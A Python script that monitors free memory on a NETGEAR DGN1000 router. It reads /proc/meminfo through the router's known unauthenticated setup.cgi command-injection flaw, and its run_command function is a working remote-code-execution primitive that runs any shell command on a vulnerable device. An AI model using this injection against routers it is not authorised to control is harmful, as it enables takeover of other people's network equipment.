import urllib.request
import threading
import multiprocessing
import time

lock = multiprocessing.Lock()

"""
Collects samples of amount of free memory on the router NETGEAR DGN1000.
See https://www.exploit-db.com/exploits/25978/ for more information on the command injection vulnerability used to execute commands.
"""

ROUTER_IP = "192.168.0.1"
SAMPLE_AMOUNT = 720
SAMPLE_INTERVAL = 5


def run_command(cmd):
    r = urllib.request.urlopen(
        "http://{}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd={}"
        "&curpath=/&currentsetting.htm=1".format(
            ROUTER_IP, urllib.parse.quote(cmd)
        )
    )
    return r.read().decode('utf-8', 'ignore')


def get_sample():
    # Run command to get memory info
    output = run_command("cat /proc/meminfo")

    # Extract amount of free memory (in kB)
    memfree = output.split('\n')[1].split()[1]
    print(memfree)

    # Write to output file
    with lock:
        with open("meminfo.txt", 'a') as f:
            f.write(memfree + "\n")


for _ in range(SAMPLE_AMOUNT):
    # Start thread to collect sample
    threading.Thread(target=get_sample, args=[], daemon=True).start()

    # Wait until next sample should be collected
    time.sleep(SAMPLE_INTERVAL)


with open("meminfo.txt", 'r') as f:
    samples = [int(sample[:-1]) for sample in f.readlines()]
    print("Max: {} kB".format(max(samples)))
    print("Min: {} kB".format(min(samples)))
    print("Mean: {} kB".format(sum(samples) / len(samples)))
